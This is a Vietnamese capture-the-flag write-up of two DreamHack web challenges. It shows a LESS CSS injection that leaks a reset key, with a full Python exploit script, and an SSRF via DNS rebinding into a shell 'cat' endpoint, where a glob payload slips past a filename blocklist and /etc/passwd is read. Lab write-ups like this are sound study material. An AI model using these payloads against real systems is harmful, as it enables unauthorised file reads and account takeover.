# Writeup LESSer Cat 
## Tổng quan
> Độ khó chung với chúng tôi (From 1-10 stars): ★★★★☆☆☆☆☆☆
## Lý lịch
<img width="934" height="467" alt="image" src="https://github.com/user-attachments/assets/e39db115-9ca0-4892-9c7f-6a91335c81bd" /> <br>
Đầu tiên khi mới vào trang chủ nó hiện với 2 chức năng <b>ColorPicker</b> và <b>Cat Gallery</b> <br>
<img width="796" height="367" alt="image" src="https://github.com/user-attachments/assets/69498d72-3f5d-42de-a5f4-762d621d019e" /> <br>
Và không có gì đặc biệt ở đây chúng ta cùng phân tích <a href="https://github.com/Capt-Webk5/Challenge-Web/tree/main/DreamHack/Level5/LESSer%20Cat">Mã Nguồn</a> <br>
## Phân tích
Ở mã nguồn theo tôi phát hiện ở tuyến đường <b>index.js</b> <br>
```js
app.post('/reset_mail', (req, res) => {
  // TODO
  // Make SMTP server later...

  fs.writeFileSync('./mail.log', crypto.randomBytes(16).toString('hex'));

  return res.send("Reset Mail Send.");
})
```
Ở đây nó sẽ có chức năng reset_mail khi người dùng gửi đến chúng nó sẽ tiến hành ghi file với reset_key được random ngẫu nhiên <br>
<img width="924" height="497" alt="image" src="https://github.com/user-attachments/assets/4266c9a8-0c79-45c1-adf0-0a8c36670762" /> <br>
Tiếp theo tôi thấy răng ở chức năng: <br>
```js
app.post('/pass_reset', (req, res) => {
  var reset_password = req.body.password;
  var reset_key = req.body.key;
  
  if(fs.existsSync("./mail.log")){

  
    if(fs.readFileSync('./mail.log', "utf8") == reset_key){

      admin_data = {
        "admin" : crypto.createHash('sha256').update(reset_password).digest('hex')
      };

      return res.send("Reset Done");
    }

  }else {

    return res.send("Reset Key is missing");

  }
  
  return res.send("Reset Key is invalid");
})

app.post('/login', (req,res) => {

  var username = req.body.username;
  var password = req.body.password;
  
  if(username == "admin"){
    if(crypto.createHash('sha256').update(password).digest('hex') == admin_data['admin']){
      return res.send(FLAG);
    }

    return res.send("Login fail");
  }

  return res.send("Admin Only");
})
```
Ở /pass_reset của chúng ta nó sẽ lấy reset_key từ phần reset_mail ở body sau đó nó kiểm tra ở mail.log tồn tại thì tiến hành đọc file nếu == reset_key trong mail.log được tạo thì chúng ta có thể update được password sau đó chúng ta có thể lấy password vừa update chúng ta có thể login để get FLAG. <br>
Vậy chức năng nào cho phép điều đó để đọc được phần reset_key trong khi post nó chỉ cho phép ghi .... chúng ta cùng lùi lại phần chọn màu như sau: <br>
```js
app.post('/color', (req, res) => {

  const background = req.body.bgColor;

  const font = req.body.fontColor;

  if(background === undefined || font === undefined) return res.send("Set Your Color Code!");

  var colorDict = {
    "bgcolor" : background,
    "color" : font
  }

  var css = colorPicker(colorDict);

  if (css == false) return res.sendStatus(500);

  less.render(css.toString(), (error, output) => {
  
    if(error){
      return res.send(`Less Compile Error`);
    }

    fs.writeFileSync('./static/image.css', output['css']);
    
    return res.send(`ColorPicker Done`);
  
  })
})
```
Ở đây khi chúng ta pick màu nó sẽ lấy 2 tham số <b>bgcolor</b> và <b>color</b> sau đó nó sẽ gọi hàm <b>colorPicker</b> ở hàm colorPicker xử lí chức năng ra sao : <br>
```js
function colorPicker(colorDict){

  var css = "";

  for (var key in colorDict){

    try{

      if(!colorDict[key].match(/^#[\w\d]{6}$/)) return false;

    } 
    catch(error){
      console.log(error)
    }

    css += `@${key}:` + colorDict[key] + ";";

  }

  css = css + "body{ background-color: @bgcolor; color: @color; }";

  return css;
}
```
Ở đây nó sẽ lấy cặp key của chúng ta sau đó đưa vào try catch kiểm tra regex phải bắt đầu dấu # và nếu khác regex sẽ báo false và sau đó ngược lại nó đưa vào css  với key chúng ta chọn và sau khi đó <br>
```js
 if (css == false) return res.sendStatus(500);

  less.render(css.toString(), (error, output) => {
  
    if(error){
      return res.send(`Less Compile Error`);
    }

    fs.writeFileSync('./static/image.css', output['css']);
    
    return res.send(`ColorPicker Done`);
  
  })
```
nó sẽ ghi file của chúng ta ra /static/image.css sau đó chúng ta truy cập lấy được màu sắc với chúng ta pick ở đây đặc biệt tôi phát hiện nó sử dụng <b>less.render</b> ra biên dịch và sau khi tìm kiếm tôi phát hiện có lỗ hổng css injection từ less bằng cách đó chúng ta cần tìm cách đưa vào shell để đọc file mail.log đúng ko vậy bằng cách nào chúng ta có thể chèn vào ở phần màu sắc <br>
```note
colorPicker làm: css += \@${key}:` + colorDict[key] + ";"`.
Trước đó gọi colorDict[key].match(...) trong try { ... } catch(error) {}.
Nếu colorDict[key] là mảng (ví dụ bgColor[]=...), thì match không tồn tại → gọi sẽ ném lỗi → bị catch nuốt đi → không trả về false → hàm tiếp tục chèn nguyên giá trị mảng (dùng toString() → nối các phần bằng ,) vào CSS.
```
Bằng cách đó tôi truyền 1 kí tự đặc biệt bằng cách gửi 1 phần tử mảng kết quả trong LESS trở thành: <br>
```note
bgColor[] = ;@import (inline) "mail.log";
fontColor = #ffffff
```
Khi qua colorPicker, chuỗi CSS tạo ra sẽ như: <br>
```note
@bgcolor:#000000;@import (inline) "mail.log";;
@color:#ffffff;
body{ background-color: @bgcolor; color: @color; }
```
<img width="949" height="528" alt="image" src="https://github.com/user-attachments/assets/0eb938a6-e456-4291-be5c-1da11f92c96a" /> <br>
Chúng ta đã inject thành công sau đó truy cập /image.css để get reset_key đã reset <br>
<img width="413" height="139" alt="image" src="https://github.com/user-attachments/assets/4e30b836-a564-4f6c-8a95-60bc8c21c96e" /> <br>
Đã leak được thành công. <br>
## Khai thác
Để quá trình tự động hóa tôi đã viết 1 script khai thác: <br>
```py
import requests
import re

class Exploit:
    def __init__(self, baseURL, newPassword, payload, timeout):
        self.baseURL = baseURL.rstrip("/")
        self.newPassword = newPassword
        self.payload = payload
        self.timeout = timeout

    def trigger_reset_mail(self):
        print(f"[+] Reset Mail Write Secret Key")
        response = requests.post(f"{self.baseURL}/reset_mail", timeout=self.timeout)
        if response.status_code == 200:
            print(f"[+] Trigger Successfully: ", response.text, "\n")
            return True
        else:
            print(f"[-] Trigger Failed: ", response.text)
            return False

    def leak_secret_key(self):
        print(f"[+] Leak Secret Key From Color")
        data = {
            "bgColor[]": self.payload, 
            "fontColor": "#000000"
        }
        response = requests.post(f"{self.baseURL}/color", data=data, timeout=self.timeout)
        if "ColorPicker Done" in response.text:
            print(f"[+] Trigger Shell Successfully")
            return True
        else:
            print(f"[-] Trigger Shell Failed")
            return False

    def fetch_image(self):
        print(f"[+] Get Secret Key")
        url = f"{self.baseURL}/image.css"
        response = requests.get(url=url, timeout=self.timeout)
        if response.status_code == 200:
            print(f"[+] Leak Secret Key Success: ", response.text, "\n")
            return response.text 
        else:
            print(f"[-] Leak Secret Key Failed: ", response.text, "\n")
            return None

    def pass_reset_key(self, text_css):
        secret = re.search(r'([0-9a-f]{32})', text_css)
        if secret:
            return secret.group(1)
        else:
            return None

    def pass_reset(self, secret_key):
        url = f"{self.baseURL}/pass_reset"
        data = {
            "password": self.newPassword,
            "key": secret_key
        }
        response = requests.post(url=url, data=data, timeout=self.timeout)
        if "Reset Done" in response.text:
            print(f"[+] Reset Password Success")
            return True
        else:
            print(f"[-] Reset Password Failed")
            return False

    def login_get_flag(self):
        url = f"{self.baseURL}/login"
        data = {
            "username": "admin",
            "password": self.newPassword
        }
        response = requests.post(url=url, data=data, timeout=self.timeout)
        if response.status_code == 200:
            print(f"[+] Login Success: ", response.text, "\n")
        else:
            print(f"[-] Login Failed: ", response.text, "\n")

        flag = re.search(r"(flag\{.*?\})", response.text, re.IGNORECASE)
        if flag:
            print(f"[+] DONE FLAG HERE: \n", flag.group(1))
        else:
            print(f"[-] Not Flag")

    def run(self):
        self.trigger_reset_mail()
        self.leak_secret_key()
        css_text = self.fetch_image()
        if not css_text:
            print(f"[+] Not Found Key")
            return
        key = self.pass_reset_key(css_text)
        if not key:
            print(f"[-] Secret key regex not found")
            return
        print(f"[+] Got Key: ", key)
        self.pass_reset(key)
        self.login_get_flag()


if __name__ == "__main__":
    BASE_URL = "http://127.0.0.1:3000"
    newPassword = "123"
    payload = '#5C62D6;@import (inline) "mail.log";'
    timeout = 5.0
    exploit = Exploit(BASE_URL, newPassword, payload, timeout)
    exploit.run()
```
Ouput: <br>
<img width="626" height="347" alt="image" src="https://github.com/user-attachments/assets/76b05b6b-caed-4ac5-b444-f41e74459d76" /> <br>
## Kết Luận
Những gì tôi học được: <br>
> 1. Lợi dụng Less CSS Injection để đọc file tùy ý RCE

## Writeup HTTP File Reader
<img width="911" height="314" alt="image" src="https://github.com/user-attachments/assets/c16fd814-3605-40c2-b13f-a2bc32261a8e" /> <br>
Không có gì đặc biệt ở đây chúng ta cùng xem mã nguồn như sau ở <b>main.go</b> nó lấy 3 trường host, port, path rồi server tự http.get() tới http://{host}/{port}/{path} để hiển thị nội dung trả về chúng ta và chặn địa chỉ IP LoopBack: <br>
Ở đây lỗi TOCTOU / DNS rebinding: họ kiểm tra IP đã resolve (không phải loopback), nhưng khi request thật vẫn dùng host (tên miền) chứ không ghim IP đã kiểm tra — cho phép đổi bản ghi DNS giữa lúc “check” và “use” bằng cách đó chúng ta có thể tạo ra hostname chuyển đổi giữa 2 IP để qua check.
```go
r.POST("/request", func(c *gin.Context) {
		var input RequestInput
		if err := c.ShouldBind(&input); err != nil {
			c.HTML(http.StatusBadRequest, "index.html", gin.H{"error": err.Error()})
			return
		}

		host := strings.TrimPrefix(strings.TrimPrefix(input.Host, "http://"), "https://")

		portNum, err := strconv.Atoi(input.Port)
		if err != nil || portNum < 1 || portNum > 65535 {
			c.HTML(http.StatusBadRequest, "index.html", gin.H{"error": "invalid port"})
			return
		}

		var addr netip.Addr

		if parsed, err := netip.ParseAddr(host); err == nil {
			addr = parsed
		} else {
			ips, err := net.LookupIP(host)
			if err != nil || len(ips) == 0 {
				c.HTML(http.StatusInternalServerError, "index.html", gin.H{"error": "cannot resolve host"})
				return
			}
			ipStr := ips[0].String()
			parsed, err := netip.ParseAddr(ipStr)
			if err != nil {
				c.HTML(http.StatusInternalServerError, "index.html", gin.H{"error": "resolved address is invalid"})
				return
			}
			addr = parsed
		}
		unspecified, _ := netip.ParseAddr("0.0.0.0")
		if addr.IsLoopback() || addr == unspecified {
			c.HTML(http.StatusForbidden, "index.html", gin.H{"error": "localhost is not allowed"})
			return
		}


		url := fmt.Sprintf("http://%s:%d/%s", host, portNum, strings.TrimLeft(input.Path, "/"))

		resp, err := http.Get(url)
		if err != nil {
			c.HTML(http.StatusInternalServerError, "index.html", gin.H{"error": err.Error()})
			return
		}
		defer resp.Body.Close()

		body, _ := io.ReadAll(resp.Body)

		c.HTML(http.StatusOK, "index.html", gin.H{
			"url":        url,
			"resolvedIP": addr.String(),
			"statusCode": resp.StatusCode,
			"body":       string(body),
		})
	})
```
Ở file <b>api/read.go</b> đầu tiên nó chặn tất cả các từ khóa flag dấu . dấu * khá gắt nhưng không chặn dấu []<br>
```go
var banned = regexp.MustCompile(`(?i)(flag|[\@\$\*\{\!\?\.\%\;\|\"\'\#\^\&\(\)\+\=\<\>\\])`)

func CheckFileName(path string) error {
	if loc := banned.FindStringIndex(path); loc != nil {
		bad := path[loc[0]:loc[1]]
		return fmt.Errorf("disallowed char detected: %q", bad)
	}
	return nil
}
```
Sau khi check filename nó gọi api/read với filename sau đó đưa vào exec để thực thi lệnh chúng ta: <br>
```go
func RegisterReadRoutes(r *gin.Engine) {
	r.GET("/api/read", func(c *gin.Context) {
		ipPort :=c.Request.RemoteAddr
		host := ipPort
		if i := strings.LastIndex(ipPort, ":"); i != -1 {
			host = ipPort[:i]
		}
	
		clientIP := net.ParseIP(host)
		if clientIP == nil {
			c.String(http.StatusBadRequest, "invalid client ip")
			return
		}

		if !clientIP.Equal(net.ParseIP("127.0.0.1")) {
			c.String(http.StatusForbidden, "access denied")
			return
		}

		filename := c.Query("filename")
		if filename == "" {
			c.String(http.StatusBadRequest, "missing filename")
			return
		}

		if err := CheckFileName(filename); err != nil {
			c.String(http.StatusForbidden, err.Error())
			return
		}

		cmd := exec.Command("sh", "-c", "cat " + filename)
		stdout, err := cmd.StdoutPipe()
		if err != nil {
			c.String(http.StatusInternalServerError, "failed to create stdout pipe")
			return
		}

		if err := cmd.Start(); err != nil {
			c.String(http.StatusInternalServerError, fmt.Sprintf("failed to start command: %v", err))
			return
		}
```
## Khai thác
Với những điều đã nói như trên đầu tiên chúng ta cần SSRF + DNS Rebiding vào /api/read. Ở /request, server chỉ cấm loopback ở bước resolve, nhưng gọi thật bằng hostname → ta dùng một domain “rebind” để vượt qua check ngay lúc này tôi tìm được payload trên <b>payloadallthething</b> như sau: <br>
<img width="457" height="360" alt="image" src="https://github.com/user-attachments/assets/d8e3c6b4-026f-4413-9b63-1b314c05067b" /><br>
Và thử triển khai đọc file /etc/passwd đã thành công như sau <br>
<img width="758" height="376" alt="image" src="https://github.com/user-attachments/assets/0f770423-0f82-4c8b-8a7c-b05031b688d9" /> <br>
Bây giờ để đọc được file flag.txt chúng ta cần bypass flag và dấu . sau quá trình tìm hiểu tôi đã tìm được dùng <b>fla[g] trong URL Globing</b> không còn từ flag liền qua mặt được còn dấu . sau quá trình tôi tìm hiểu chúng ta có thể bỏ qua nó bằng cách sử dụng <b>POSIX character classes trong glob</b> [:punct:]: Phù hợp với các ký tự dấu câu trong [...] match một ký tự dấu câu (bao gồm dấu chấm .) quá được regex -> Payload cuối: <br>
<b>/fla[g][[:punct:]]txt</b> sẽ glob thành <b>/flag.txt</b> đã thành công như dưới <br>
<img width="724" height="177" alt="image" src="https://github.com/user-attachments/assets/c30836ed-fcae-4902-af73-89b055afe2a5" />















